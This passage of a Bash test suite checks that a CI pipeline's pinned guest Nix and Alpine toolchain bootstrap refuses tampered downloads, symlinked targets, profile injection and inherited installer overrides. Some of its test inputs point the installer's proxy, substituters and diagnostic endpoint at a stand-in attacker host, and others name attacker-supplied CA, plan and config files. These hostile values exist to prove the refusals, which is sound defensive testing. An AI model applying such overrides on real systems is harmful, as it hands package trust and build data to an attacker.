grep -Fxq -- '/nix/store/diene-guest-rail/etc/profile.d/nix-daemon.sh' \
  "$guest_rail_happy/harness/profile.resolved" ||
  fail 'S0 profile did not resolve to the exact in-store path'
ok 'S0 binds, sources, records, and rechecks the exact profile and Nix configuration'

cat >"$scratch/guest-rail-develop.argv" <<'GUEST_RAIL_DEVELOP_ARGV'
--extra-experimental-features
nix-command flakes
develop
.#ci
-c
./scripts/ci/environment-k3d-run.sh
driver
/run/diene-ci
GUEST_RAIL_DEVELOP_ARGV
diff -u "$scratch/guest-rail-develop.argv" \
  "$guest_rail_happy/harness/nix-develop.argv" >/dev/null ||
  fail 'S0 did not reach the exact terminal fixed-path nix develop argv'
grep -Fxq -- /run/diene-ci/source "$guest_rail_happy/harness/nix-develop.cwd" ||
  fail 'S0 did not enter nix develop from the exact extracted source CWD'
ok 'S0 reaches the exact terminal fixed-path nix develop argv from the exact source CWD'

guest_rail_run_case S1 happy 64 GuestNixInstallerUntrusted
guest_rail_run_case S2 happy 64 GuestNixInstallerUntrusted
assert_contains "$GUEST_RAIL_RESULT/harness/remote.stderr" NIX_INSTALLER_EXTRA_CONF
assert_not_contains "$GUEST_RAIL_RESULT/harness/remote.stderr" guest-rail-secret-extra
guest_rail_run_case S3 happy 64 GuestNixInstallerUntrusted
assert_contains "$GUEST_RAIL_RESULT/harness/remote.stderr" NIX_CONFIG
assert_not_contains "$GUEST_RAIL_RESULT/harness/remote.stderr" guest-rail-secret-config
guest_rail_run_case S4 version-wrong 64 GuestNixInstallerUntrusted
grep -Fxq -- 'nix-installer 3.21.8' \
  "$GUEST_RAIL_RESULT/evidence/guest-nix/installer-version.txt" ||
  fail 'S4 did not exercise the wrong installer stdout injection'
guest_rail_run_case S5 version-stderr 64 GuestNixInstallerUntrusted
grep -Fxq -- warning "$GUEST_RAIL_RESULT/evidence/guest-nix/installer-version.stderr" ||
  fail 'S5 did not exercise the installer stderr injection'
guest_rail_run_case S6 install-fail 64 GuestNixInstallFailed
grep -Fxq -- installer-install "$GUEST_RAIL_RESULT/harness/events" ||
  fail 'S6 did not exercise the nonzero installer call'
guest_rail_run_case S7 config-unsafe 64 GuestNixIdentityUnexpected
[[ ! -e $GUEST_RAIL_RESULT/harness/final-nix.conf ]] ||
  fail 'S7 unexpectedly created a safe regular Nix configuration'
guest_rail_run_case S8 profile-missing 64 GuestNixIdentityUnexpected
[[ ! -e $GUEST_RAIL_RESULT/harness/profile.resolved ]] ||
  fail 'S8 unexpectedly created the required profile'
guest_rail_run_case S9 profile-dangling 64 GuestNixIdentityUnexpected
[[ -f $GUEST_RAIL_RESULT/harness/profile.resolved ]] ||
  fail 'S9 did not exercise the dangling fixed profile link'
guest_rail_run_case S10 profile-outside 64 GuestNixIdentityUnexpected
grep -Fxq -- /run/diene-ci/harness/outside-profile.sh \
  "$GUEST_RAIL_RESULT/harness/profile.resolved" ||
  fail 'S10 did not exercise an out-of-store resolved profile'
guest_rail_run_case S11 profile-source-fail 64 GuestNixProfileSourceFailed
grep -Fxq -- profile-resolved "$GUEST_RAIL_RESULT/harness/events" ||
  fail 'S11 did not reach the nonzero profile source'
assert_not_contains "$GUEST_RAIL_RESULT/harness/events" profile-sourced
guest_rail_run_case S12 config-mutated 64 GuestNixIdentityUnexpected
grep -Fxq -- 'post-profile-mutation = true' "$GUEST_RAIL_RESULT/harness/final-nix.conf" ||
  fail 'S12 did not mutate /etc/nix/nix.conf between binding and recheck'

guest_rail_profile_identity_message='the installed /etc/nix/nix.conf changed before develop'
guest_rail_profile_source_message='the exact guest Nix profile returned nonzero while being sourced'
guest_rail_profile_refusal_case S12c s12c-digest-rebind GuestNixIdentityUnexpected \
  "$guest_rail_profile_identity_message" present
guest_rail_profile_refusal_case S12d s12d-fail-noop GuestNixIdentityUnexpected \
  "$guest_rail_profile_identity_message" present
guest_rail_profile_refusal_case S12e s12e-hash-rebind GuestNixIdentityUnexpected \
  "$guest_rail_profile_identity_message" present
guest_rail_profile_refusal_case S12g s12g-path-shadow GuestNixIdentityUnexpected \
  "$guest_rail_profile_identity_message" present
guest_rail_profile_refusal_case S12h s12h-all-vectors GuestNixIdentityUnexpected \
  "$guest_rail_profile_identity_message" present

guest_rail_run_case S12i s12i-readonly nonzero ''
guest_rail_assert_post_profile_refusal s12i-readonly absent
assert_contains "$GUEST_RAIL_RESULT/harness/remote.stderr" \
  'guest_nix_profile_rc: is read only'

guest_rail_run_case S12l s12l-cdpath 0 ''
grep -Fxq -- s12l-cdpath "$GUEST_RAIL_RESULT/harness/injection-ran" ||
  fail 'S12l did not run the CDPATH profile injection'
diff -u "$scratch/guest-rail-develop.argv" \
  "$GUEST_RAIL_RESULT/harness/nix-develop.argv" >/dev/null ||
  fail 'S12l did not preserve the exact terminal nix develop argv'
grep -Fxq -- /run/diene-ci/source "$GUEST_RAIL_RESULT/harness/nix-develop.cwd" ||
  fail 'S12l let CDPATH redirect nix develop to the decoy source'
[[ $(cat "$GUEST_RAIL_RESULT/harness/remote.stdout") == "$guest_rail_expected_stdout" ]] ||
  fail 'S12l emitted output from a CDPATH-selected decoy'
ok 'S12l ignores profile CDPATH and develops from the exact absolute source CWD'

guest_rail_profile_refusal_case S12n s12n-export-names GuestNixIdentityUnexpected \
  "$guest_rail_profile_identity_message" present
guest_rail_profile_refusal_case S12p s12p-return-shadow GuestNixProfileSourceFailed \
  "$guest_rail_profile_source_message" absent

guest_rail_run_case S13 nix-absent 64 GuestNixToolchainAbsent
grep -Fxq -- '/nix/store/diene-guest-rail/etc/profile.d/nix-daemon.sh' \
  "$GUEST_RAIL_RESULT/harness/profile.resolved" ||
  fail 'S13 did not reach the fixed direct-Nix availability guard'

guest_rail_run_case G1 happy 64 GuestToolchainUntrusted
guest_rail_run_case G2 happy 64 GuestToolchainUntrusted
guest_rail_run_case G3 happy 64 GuestToolchainUntrusted
guest_rail_run_case G4 g4-apk-absent 64 GuestToolchainUnavailable
guest_rail_run_case G5 happy 64 GuestToolchainUnavailable
assert_contains "$GUEST_RAIL_RESULT/harness/remote.stderr" APK_CONFIG
assert_not_contains "$GUEST_RAIL_RESULT/harness/remote.stderr" guest-rail-secret-apk
guest_rail_run_case G6 g6-identity-rebind 64 GuestToolchainIdentityUnexpected
grep -Fq -- 'Installing sed (4.10-r1)' "$GUEST_RAIL_RESULT/evidence/gnu-toolchain/install.log" ||
  fail 'G6 did not run the real install before its post-install identity rebind'
guest_rail_run_case G7 g7-tar-stub 64 GuestToolchainTarUnexpected
guest_rail_run_case G8 g8-apk-noop 64 GuestToolchainIdentityUnexpected
[[ -f $GUEST_RAIL_RESULT/evidence/gnu-toolchain/install.log &&
  ! -s $GUEST_RAIL_RESULT/evidence/gnu-toolchain/install.log ]] ||
  fail 'G8 did not exercise a silently successful no-op package install'
guest_rail_run_case G9 happy 0 ''
grep -Fxq -- stage0-preceded-validator "$GUEST_RAIL_RESULT/harness/order" ||
  fail 'G9 did not prove stage 0 completes before the archive validator runs'
[[ -f $GUEST_RAIL_RESULT/evidence/gnu-toolchain/identity.txt ]] ||
  fail 'G9 ordering probe ran without the stage-0 identity record'
ok 'G9 proves the pinned GNU bootstrap completes before any climb code executes'
guest_rail_run_case G10 g10-cancel nonzero ''
[[ $(cat "$GUEST_RAIL_RESULT/harness/remote.rc") -ge 128 ]] ||
  fail 'G10 did not cancel the exact rail with a signal status'
guest_rail_run_case G11 g11-rerun 64 GuestNixPreexistingState
[[ $(cat "$GUEST_RAIL_RESULT/harness/first.rc") == 0 ]] ||
  fail 'G11 first pass did not complete the exact rail before the retry'
[[ ! -s $GUEST_RAIL_RESULT/harness/first.stderr ]] ||
  fail 'G11 first pass refused instead of completing the exact rail'
# The retry is defined, not incidental: it stops at the pristine-guest gate that
# now sits above stage 0, so apk is never re-run against a mutated guest.
[[ $(grep -Fxc -- installer-install "$GUEST_RAIL_RESULT/harness/events") == 1 ]] ||
  fail 'G11 retry re-entered the installed guest instead of refusing above stage 0'
guest_rail_run_case G12 g12-no-network 64 GuestToolchainInstallFailed
grep -Fq -- 'unable to select packages' \
  "$GUEST_RAIL_RESULT/evidence/gnu-toolchain/install.log" ||
  fail 'G12 did not prove the masked repository made the offline install fail closed'
assert_not_contains "$GUEST_RAIL_RESULT/harness/remote.stdout" 'unable to select packages'
ok 'G1-G12 refuse every package, apk, identity, tar, ordering, cancellation, and network vector'

printf '== pinned guest Nix bootstrap fails closed ==\n'

guest_nix_work_lib=$work/scripts/ci/environment-lib.sh
guest_nix_work_lib_backup=$scratch/environment-lib.guest-nix-good.sh
cp "$guest_nix_work_lib" "$guest_nix_work_lib_backup"

guest_nix_invalid_contract_case() {
  local run_id=${1:?run id required} mutation=${2:?contract mutation required}
  cp "$guest_nix_work_lib_backup" "$guest_nix_work_lib"
  case $mutation in
    rolling-url)
      sed -i 's|^DIENE_GUEST_NIX_INSTALLER_URL=.*|DIENE_GUEST_NIX_INSTALLER_URL=https://install.determinate.systems/nix|' \
        "$guest_nix_work_lib"
      ;;
    unpinned-payload)
      sed -i 's|^DIENE_GUEST_NIX_PAYLOAD_URL=.*|DIENE_GUEST_NIX_PAYLOAD_URL=https://install.determinate.systems/nix/tag/v3.21.9/other|' \
        "$guest_nix_work_lib"
      ;;
    short-digest)
      sed -i 's|^DIENE_GUEST_NIX_INSTALLER_DIGEST=.*|DIENE_GUEST_NIX_INSTALLER_DIGEST=sha256:abcd|' \
        "$guest_nix_work_lib"
      ;;
    malformed-bytes)
      sed -i 's|^DIENE_GUEST_NIX_PAYLOAD_BYTES=.*|DIENE_GUEST_NIX_PAYLOAD_BYTES=not-a-number|' \
        "$guest_nix_work_lib"
      ;;
    wrong-architecture)
      sed -i 's|^DIENE_GUEST_NIX_ARCH=.*|DIENE_GUEST_NIX_ARCH=aarch64|' "$guest_nix_work_lib"
      ;;
    *) fail "unknown guest Nix contract mutation $mutation" ;;
  esac
  prepare_run "$run_id"
  expect_precreate_refusal InputContractInvalid env ./scripts/ci/environment-k3d-run.sh orchestrate
  cp "$guest_nix_work_lib_backup" "$guest_nix_work_lib"
}

guest_nix_invalid_contract_case 7301 rolling-url
guest_nix_invalid_contract_case 7302 unpinned-payload
guest_nix_invalid_contract_case 7303 short-digest
guest_nix_invalid_contract_case 7304 malformed-bytes
guest_nix_invalid_contract_case 7305 wrong-architecture

guest_nix_contract_value_refusal() {
  local label=${1:?label required} rc=0
  if (
    # shellcheck source=/dev/null
    source "$guest_nix_work_lib_backup"
    # shellcheck disable=SC2100
    case $label in
      empty-identity) DIENE_GUEST_NIX_EXPECTED_IDENTITY= ;;
      multiline-identity) DIENE_GUEST_NIX_EXPECTED_IDENTITY=$'nix (Determinate Nix 3.21.9) 2.34.8\nextra' ;;
      wrong-mode) DIENE_GUEST_NIX_EXECUTION_MODE=shell-bootstrap ;;
      *) exit 127 ;;
    esac
    export DIENE_GUEST_NIX_EXPECTED_IDENTITY DIENE_GUEST_NIX_EXECUTION_MODE
    diene_guest_nix_contract
  ) >"$scratch/guest-nix-contract-$label.out" 2>"$scratch/guest-nix-contract-$label.err"; then
    fail "$label guest Nix contract unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label guest Nix contract did not exit 64"
  assert_contains "$scratch/guest-nix-contract-$label.err" InputContractInvalid
}
guest_nix_contract_value_refusal empty-identity
guest_nix_contract_value_refusal multiline-identity
guest_nix_contract_value_refusal wrong-mode
ok 'rolling, unpinned, malformed, non-x86_64, empty, multiline, and shell-mode contracts refuse before create'

guest_nix_fetch_refusal() {
  local run_id=${1:?run id required} scenario=${2:?fetch scenario required}
  prepare_run "$run_id"
  expect_precreate_refusal GuestNixInstallerUntrusted env \
    FAKE_GUEST_NIX_FETCH_SCENARIO="$scenario" ./scripts/ci/environment-k3d-run.sh orchestrate
  ! find "$RUNNER_TEMP" -name '*.tmp.*' -print -quit | grep -q . ||
    fail "$scenario left a private acquisition temporary file"
  ! find "$RUNNER_TEMP" -name 'guest-nix-*.sha256' -print -quit | grep -q . ||
    fail "$scenario published sidecars before both artifacts verified"
}
guest_nix_fetch_refusal 7310 redirect
guest_nix_fetch_refusal 7311 transport-fail
guest_nix_fetch_refusal 7312 installer-short
guest_nix_fetch_refusal 7313 installer-digest
guest_nix_fetch_refusal 7314 payload-short
guest_nix_fetch_refusal 7315 payload-digest
ok 'redirect, transport, byte-count, and full-digest failures leave zero creates and no partial publication'

guest_toolchain_fetch_refusal() {
  local run_id=${1:?run id required} scenario=${2:?fetch scenario required}
  prepare_run "$run_id"
  expect_precreate_refusal GuestToolchainUntrusted env \
    FAKE_GUEST_NIX_FETCH_SCENARIO="$scenario" ./scripts/ci/environment-k3d-run.sh orchestrate
  ! find "$RUNNER_TEMP" -name '*.tmp.*' -print -quit | grep -q . ||
    fail "$scenario left a private package acquisition temporary file"
  ! find "$RUNNER_TEMP" -path '*/gnu/*' -name '*.apk.sha256' -print -quit | grep -q . ||
    fail "$scenario published a package sidecar before its bytes verified"
}
guest_toolchain_fetch_refusal 7316 apk-short
guest_toolchain_fetch_refusal 7317 apk-digest

guest_toolchain_budget_refusal() {
  local label=${1:?budget label required} url=${2:?url required} budget=${3:?budget required}
  local root=$scratch/guest-toolchain-budget-$label rc=0
  install -d -m 0700 "$root"
  if (
    # shellcheck source=/dev/null
    source "$guest_nix_work_lib_backup"
    # shellcheck disable=SC2329
    diene_pinned_downloader() { printf '%s\n' "$fake_guest_nix_curl"; }
    export FAKE_GUEST_NIX_CURL_LOG=$root.curl
    export FAKE_GUEST_NIX_SOURCE_DIR=$guest_nix_fixture_dir
    export FAKE_GUEST_TOOLCHAIN_SOURCE_DIR=$guest_toolchain_apk_dir
    diene_fetch_pinned_artifact "$url" \
      sha256:0000000000000000000000000000000000000000000000000000000000000000 \
      1 "$root/artifact" "$budget"
  ) >"$root.out" 2>"$root.err"; then
    fail "$label redirect budget unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label redirect budget did not exit 64"
  assert_contains "$root.err" InputContractInvalid
  [[ ! -e $root/artifact && ! -s $root.curl ]] ||
    fail "$label redirect budget fetched or published bytes before refusing"
}
guest_toolchain_budget_refusal nix-url-one-redirect \
  'https://install.determinate.systems/nix/tag/v3.21.9' 1
guest_toolchain_budget_refusal apk-url-two-redirects \
  'https://apk.cgr.dev/chainguard/x86_64/sed-4.10-r1.apk' 2
ok 'a short or changed package refuses before create and only the package class may spend one redirect'

guest_nix_publication_refusal() {
  local label=${1:?publication label required} shape=${2:?publication shape required}
  local root=$scratch/guest-nix-publication-$label outside=$scratch/guest-nix-publication-$label-outside
  local target curl_log=$scratch/guest-nix-publication-$label.curl rc=0
  install -d -m 0700 "$root" "$outside"
  : >"$curl_log"
  case $shape in
    target-symlink)
      install -d -m 0700 "$root/publish"
      printf '%s\n' sentinel >"$outside/sentinel"
      ln -s "$outside/sentinel" "$root/publish/guest-nix-bootstrap.sh"
      target=$root/publish/guest-nix-bootstrap.sh
      ;;
    parent-symlink)
      ln -s "$outside" "$root/publish"
      target=$root/publish/guest-nix-bootstrap.sh
      ;;
    *) fail "unknown guest Nix publication shape $shape" ;;
  esac
  if (
    # shellcheck source=/dev/null
    source "$guest_nix_work_lib_backup"
    # shellcheck disable=SC2329
    diene_pinned_downloader() { printf '%s\n' "$fake_guest_nix_curl"; }
    export FAKE_GUEST_NIX_CURL_LOG=$curl_log
    export FAKE_GUEST_NIX_SOURCE_DIR=$guest_nix_fixture_dir
    diene_fetch_pinned_artifact "$DIENE_GUEST_NIX_INSTALLER_URL" \
      "$DIENE_GUEST_NIX_INSTALLER_DIGEST" "$DIENE_GUEST_NIX_INSTALLER_BYTES" "$target"
  ) >"$root.out" 2>"$root.err"; then
    fail "$label hostile publication target unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label hostile publication target did not exit 64"
  assert_contains "$root.err" GuestNixInstallerUntrusted
  [[ ! -s $curl_log ]] || fail "$label fetched before refusing the hostile publication target"
  [[ -z $(find "$root" -name '*.tmp.*' -print -quit) ]] ||
    fail "$label left a private publication temporary file"
  case $shape in
    target-symlink)
      [[ -L $target && $(<"$outside/sentinel") == sentinel ]] ||
        fail 'the target-symlink refusal replaced the link or changed its outside referent'
      ;;
    parent-symlink)
      [[ -L $root/publish && ! -e $outside/guest-nix-bootstrap.sh ]] ||
        fail 'the parent-symlink refusal published outside the private target directory'
      ;;
  esac
}
guest_nix_publication_refusal symlink-target target-symlink
guest_nix_publication_refusal symlink-parent parent-symlink
ok 'host acquisition refuses linked publication targets and parents before fetch or outside write'

guest_nix_downloader_override_refusal() {
  local label=${1:?downloader override label required} override=${2:?downloader override required}
  local root=$scratch/guest-nix-downloader-$label rc=0
  local target=$root/guest-nix-bootstrap.sh
  local curl_log=$root.curl-log
  install -d -m 0700 "$root"
  : >"$curl_log"
  if (
    # shellcheck source=/dev/null
    source "$template_root/scripts/ci/environment-lib.sh"
    # shellcheck disable=SC2329
    diene_pinned_downloader() { printf '%s\n' "$fake_guest_nix_curl"; }
    export DIENE_CURL_BIN=$override FAKE_GUEST_NIX_CURL_LOG=$curl_log
    export FAKE_GUEST_NIX_SOURCE_DIR=$guest_nix_fixture_dir
    diene_fetch_pinned_artifact "$DIENE_GUEST_NIX_INSTALLER_URL" \
      "$DIENE_GUEST_NIX_INSTALLER_DIGEST" "$DIENE_GUEST_NIX_INSTALLER_BYTES" "$target"
  ) >"$root.out" 2>"$root.err"; then
    fail "$label ambient downloader override unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "$label ambient downloader override did not exit 64"
  assert_contains "$root.err" GuestNixInstallerUntrusted
  [[ ! -e $target && ! -s $curl_log &&
    -z $(find "$root" -name '*.tmp.*' -print -quit) ]] ||
    fail "$label ambient downloader override fetched or published bytes"
}
evil_guest_nix_downloader=$scratch/evil-guest-nix-downloader
evil_guest_nix_downloader_marker=$scratch/evil-guest-nix-downloader.marker
cat >"$evil_guest_nix_downloader" <<'EVIL_CURL'
#!/bin/sh
: >"${EVIL_GUEST_NIX_DOWNLOADER_MARKER:?}"
exit 0
EVIL_CURL
chmod 0755 "$evil_guest_nix_downloader"
export EVIL_GUEST_NIX_DOWNLOADER_MARKER=$evil_guest_nix_downloader_marker
guest_nix_downloader_override_refusal malicious "$evil_guest_nix_downloader"
[[ ! -e $evil_guest_nix_downloader_marker ]] ||
  fail 'the malicious inherited downloader override executed before refusal'
guest_nix_downloader_override_refusal working "$fake_guest_nix_curl"
production_guest_nix_curl=$(
  # shellcheck source=/dev/null
  source "$template_root/scripts/ci/environment-lib.sh"
  unset DIENE_CURL_BIN
  diene_pinned_downloader
)
[[ $production_guest_nix_curl == /nix/store/*/bin/curl &&
  -f $production_guest_nix_curl && -x $production_guest_nix_curl ]] ||
  fail 'production guest Nix acquisition did not resolve immutable Nix-store curl'
ok 'production refuses every ambient downloader override and resolves only immutable Nix-store curl'

guest_nix_remote_refusal() {
  local run_id=${1:?run id required} scenario=${2:?remote scenario required}
  local inner_reason=${3:?inner reason required} control_name=${4:-} control_value=${5:-} rc=0
  prepare_run "$run_id"
  local runner=$RUNNER_TEMP nsc_root=$FAKE_NSC_ROOT event_log=$FAKE_GUEST_NIX_EVENT_LOG
  if (
    if [[ -n $control_name ]]; then
      export "$control_name=$control_value"
      export FAKE_GUEST_NIX_EXPECTED_HOSTILE_ENV=$control_name
    fi
    run_orchestrator "$scenario"
  ) >"$scratch/guest-remote-$scenario.out" 2>"$scratch/guest-remote-$scenario.err"; then
    fail "$scenario guest Nix refusal unexpectedly passed"
  else
    rc=$?
  fi
  ((rc != 0)) || fail "$scenario guest Nix refusal returned zero"
  assert_contains "$scratch/guest-remote-$scenario.err" NamespaceSshDriverFailed
  local remote_stderr
  remote_stderr=$(find "$runner/diene-namespace" -path '*/staging/stderr' -print -quit)
  [[ -n $remote_stderr ]] || fail "$scenario retained no SSH stderr evidence"
  assert_contains "$remote_stderr" "$inner_reason"
  if [[ -n $control_name ]]; then
    assert_contains "$remote_stderr" "$control_name"
    if [[ $control_value == secret-substituter-token ]]; then
      assert_not_contains "$remote_stderr" "$control_value"
    fi
  fi
  ! grep -Fxq -- nix-develop "$event_log" || fail "$scenario reached nix develop"
  local expect_version=false expect_install=false expect_config=false expect_profile=false
  local expect_direct_nix=false
  case $scenario in
    guest-wrong-arch | guest-preexisting | guest-preexisting-etc-nix | \
      guest-upload-* | guest-inherited-control-* | guest-apk-* | guest-inherited-apk-*) ;;
    guest-wrong-installer-version | guest-empty-installer-version | \
      guest-multiline-installer-version | guest-extra-newline-installer-version | \
      guest-installer-version-stderr)
      expect_version=true
      ;;
    guest-installer-fail)
      expect_version=true
      expect_install=true
      ;;
    guest-nix-config-unsafe)
      expect_version=true
      expect_install=true
      ;;
    guest-profile-missing | guest-profile-dangling | guest-profile-directory | \
      guest-profile-outside)
      expect_version=true
      expect_install=true
      expect_config=true
      expect_direct_nix=true
      ;;
    guest-profile-source-fail | guest-toolchain-absent)
      expect_version=true
      expect_install=true
      expect_config=true
      expect_profile=true
      ;;
    *) fail "missing event-boundary expectation for $scenario" ;;
  esac
  if [[ $expect_version == true ]]; then
    [[ $(grep -Fxc -- installer-version-probe "$event_log") == 1 ]] ||
      fail "$scenario did not reach its one allowed installer --version boundary"
  else
    ! grep -Fxq -- installer-version-probe "$event_log" ||
      fail "$scenario reached forbidden installer --version"
  fi
  if [[ $expect_install == true ]]; then
    [[ $(grep -Fxc -- 'installer-argv install linux --no-confirm --init none' "$event_log") == 1 ]] ||
      fail "$scenario did not reach its one allowed installer install boundary"
  else
    ! grep -Eq '^installer-argv( |$)' "$event_log" ||
      fail "$scenario reached forbidden installer install"
  fi
  if [[ $expect_config == true ]]; then
    [[ $(grep -Fxc -- nix-config-bound "$event_log") == 1 ]] ||
      fail "$scenario did not bind its installed Nix configuration"
  else
    ! grep -Fxq -- nix-config-bound "$event_log" ||
      fail "$scenario reached forbidden installed Nix configuration binding"
  fi
  if [[ $expect_profile == true ]]; then
    [[ $(grep -Fxc -- profile-source "$event_log") == 1 ]] ||
      fail "$scenario did not reach its one allowed profile-source boundary"
  else
    ! grep -Fxq -- profile-source "$event_log" ||
      fail "$scenario reached forbidden profile sourcing"
  fi
  if [[ $expect_direct_nix == true ]]; then
    [[ $(grep -Fxc -- direct-nix-ready "$event_log") == 1 ]] ||
      fail "$scenario did not model the usable direct Nix binary"
  else
    ! grep -Fxq -- direct-nix-ready "$event_log" ||
      fail "$scenario unexpectedly modeled a direct Nix binary"
  fi
  local version_event_line=0 install_event_line=0 profile_event_line=0
  if [[ $expect_version == true ]]; then
    version_event_line=$(grep -nFx -- installer-version-probe "$event_log" | cut -d: -f1)
  fi
  if [[ $expect_install == true ]]; then
    install_event_line=$(grep -nFx -- 'installer-argv install linux --no-confirm --init none' \
      "$event_log" | cut -d: -f1)
    [[ $version_event_line -lt $install_event_line ]] ||
      fail "$scenario installer install did not follow its version probe"
  fi
  if [[ $expect_profile == true ]]; then
    profile_event_line=$(grep -nFx -- profile-source "$event_log" | cut -d: -f1)
    [[ $install_event_line -lt $profile_event_line ]] ||
      fail "$scenario profile source did not follow its installer invocation"
  fi
  local cluster
  cluster=$(find "$nsc_root/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
  local guest_state=$nsc_root/instances/$cluster/fs/run/diene-ci
  [[ ! -e $guest_state/evidence/policy.json && ! -e $guest_state/evidence/readiness.json ]] ||
    fail "$scenario reached a protected policy or application evidence mutation"
  local failed_receipt
  failed_receipt=$(find "$runner/diene-receipts" -type f -name '*.json' -print -quit)
  [[ -n $failed_receipt ]] || fail "$scenario retained no lifecycle receipt"
  local failed_lifecycle
  failed_lifecycle=$(find "$runner/diene-namespace" -type f \
    -name namespace-lifecycle.json -print -quit)
  [[ -n $failed_lifecycle ]] || fail "$scenario retained no lifecycle evidence"
  jq -e '
    .outcome == "Fail" and
    .ssh.outcome == "Fail" and
    .destroy.outcome == "Pass" and
    .absence.outcome == "Pass"
  ' "$failed_lifecycle" >/dev/null || fail "$scenario retained no exact red SSH lifecycle"
  jq -e '
    .namespace.destroy.outcome == "Pass" and
    .namespace.absence.outcome == "Pass" and
    .namespace.policy.applied == false and
    .namespace.policy.hostileProbes == "Pending" and
    .cleanup.outcome == "Pending"
  ' "$failed_receipt" >/dev/null || fail "$scenario retained a green or mutation-bearing receipt"
  [[ $(grep -Ec "^destroy --force ${cluster} " "$FAKE_NSC_LOG") == 1 &&
    ! -e $nsc_root/instances/$cluster/live ]] ||
    fail "$scenario did not preserve exact destroy and absence"
}

guest_nix_remote_refusal 7320 guest-wrong-arch GuestNixInstallerUnsupportedArch
guest_nix_remote_refusal 7321 guest-preexisting GuestNixPreexistingState
guest_nix_remote_refusal 7339 guest-preexisting-etc-nix GuestNixPreexistingState
guest_nix_remote_refusal 7322 guest-upload-bootstrap-tamper GuestNixInstallerUntrusted
guest_nix_remote_refusal 7323 guest-upload-payload-tamper GuestNixInstallerUntrusted
guest_nix_remote_refusal 7324 guest-upload-sidecar-tamper GuestNixInstallerUntrusted
guest_nix_remote_refusal 7328 guest-upload-bootstrap-pair-tamper GuestNixInstallerUntrusted
guest_nix_remote_refusal 7329 guest-upload-payload-pair-tamper GuestNixInstallerUntrusted
guest_nix_remote_refusal 7330 guest-upload-payload-symlink GuestNixInstallerUntrusted
guest_nix_remote_refusal 7325 guest-wrong-installer-version GuestNixInstallerUntrusted
guest_nix_remote_refusal 7331 guest-empty-installer-version GuestNixInstallerUntrusted
guest_nix_remote_refusal 7332 guest-multiline-installer-version GuestNixInstallerUntrusted
guest_nix_remote_refusal 7333 guest-extra-newline-installer-version GuestNixInstallerUntrusted
guest_nix_remote_refusal 7334 guest-installer-version-stderr GuestNixInstallerUntrusted
guest_nix_remote_refusal 7326 guest-installer-fail GuestNixInstallFailed
guest_nix_remote_refusal 7340 guest-nix-config-unsafe GuestNixIdentityUnexpected
guest_nix_remote_refusal 7335 guest-profile-source-fail GuestNixProfileSourceFailed
guest_nix_remote_refusal 7336 guest-profile-missing GuestNixIdentityUnexpected
guest_nix_remote_refusal 7337 guest-profile-dangling GuestNixIdentityUnexpected
guest_nix_remote_refusal 7338 guest-profile-directory GuestNixIdentityUnexpected
guest_nix_remote_refusal 7341 guest-profile-outside GuestNixIdentityUnexpected
guest_nix_remote_refusal 7327 guest-toolchain-absent GuestNixToolchainAbsent
guest_nix_remote_refusal 7342 guest-inherited-control-extra-conf GuestNixInstallerUntrusted \
  NIX_INSTALLER_EXTRA_CONF 'secret-substituter-token'
guest_nix_remote_refusal 7343 guest-inherited-control-build-user GuestNixInstallerUntrusted \
  NIX_INSTALLER_NIX_BUILD_USER_COUNT 12
guest_nix_remote_refusal 7344 guest-inherited-control-proxy GuestNixInstallerUntrusted \
  NIX_INSTALLER_PROXY https://attacker.invalid
guest_nix_remote_refusal 7345 guest-inherited-control-certificate GuestNixInstallerUntrusted \
  NIX_INSTALLER_SSL_CERT_FILE /tmp/attacker-ca.pem
guest_nix_remote_refusal 7346 guest-inherited-control-plan GuestNixInstallerUntrusted \
  NIX_INSTALLER_PLAN /tmp/attacker-plan.json
guest_nix_remote_refusal 7347 guest-inherited-control-diagnostic GuestNixInstallerUntrusted \
  NIX_INSTALLER_DIAGNOSTIC_ENDPOINT https://attacker.invalid/collect
guest_nix_remote_refusal 7348 guest-inherited-control-config GuestNixInstallerUntrusted \
  NIX_CONFIG 'substituters = https://attacker.invalid'
guest_nix_remote_refusal 7349 guest-inherited-control-user-conf GuestNixInstallerUntrusted \
  NIX_USER_CONF_FILES /tmp/attacker-nix.conf
guest_nix_remote_refusal 7350 guest-inherited-control-path GuestNixInstallerUntrusted \
  NIX_PATH nixpkgs=/tmp/attacker
guest_nix_remote_refusal 7351 guest-inherited-control-remote GuestNixInstallerUntrusted \
  NIX_REMOTE unix:///tmp/attacker.sock
guest_nix_remote_refusal 7352 guest-inherited-control-unknown GuestNixInstallerUntrusted \
  NIX_G9_UNKNOWN 1
guest_nix_remote_refusal 7353 guest-inherited-control-nixpkgs GuestNixInstallerUntrusted \
  NIXPKGS_ALLOW_UNFREE 1
guest_nix_remote_refusal 7354 guest-apk-tamper GuestToolchainUntrusted
guest_nix_remote_refusal 7355 guest-apk-sidecar-tamper GuestToolchainUntrusted
guest_nix_remote_refusal 7356 guest-apk-pair-tamper GuestToolchainUntrusted
guest_nix_remote_refusal 7357 guest-apk-symlink GuestToolchainUntrusted
guest_nix_remote_refusal 7358 guest-apk-missing GuestToolchainUntrusted
guest_nix_remote_refusal 7359 guest-inherited-apk-config GuestToolchainUnavailable \
  APK_CONFIG /tmp/attacker-apk.conf
guest_nix_remote_refusal 7360 guest-inherited-apk-root GuestToolchainUnavailable \
  APKROOT /tmp/attacker-root
ok 'every remote refusal stops at its exact version, install, profile, and develop event boundary'
ok 'a changed, missing, linked, or re-paired uploaded package refuses before the guest Nix rail'

guest_nix_identity_probe() (
  local mode=${1:?identity mode required} root=${2:?identity root required}
  # shellcheck source=/dev/null
  source "$guest_nix_work_lib_backup"
  local evidence=$root/evidence/guest-nix store_root=$root/nix/store
  local store_bin=$store_root/synthetic-determinate/bin/nix
  local nix_bin=$root/nix/var/nix/profiles/default/bin/nix
  local installed_copy=$root/nix/nix-installer
  local bootstrap=$root/run/diene-ci/guest-nix-bootstrap.sh
  local payload=$root/run/diene-ci/guest-nix-installer input=$root/run/diene-ci/inputs.json
  install -d -m 0700 "$evidence" "$(dirname -- "$store_bin")" "$(dirname -- "$nix_bin")" \
    "$(dirname -- "$installed_copy")" "$(dirname -- "$bootstrap")" "$root/etc/nix"
  cat >"$store_bin" <<'NIX'
#!/bin/sh
case ${FAKE_IDENTITY_MODE:-happy} in
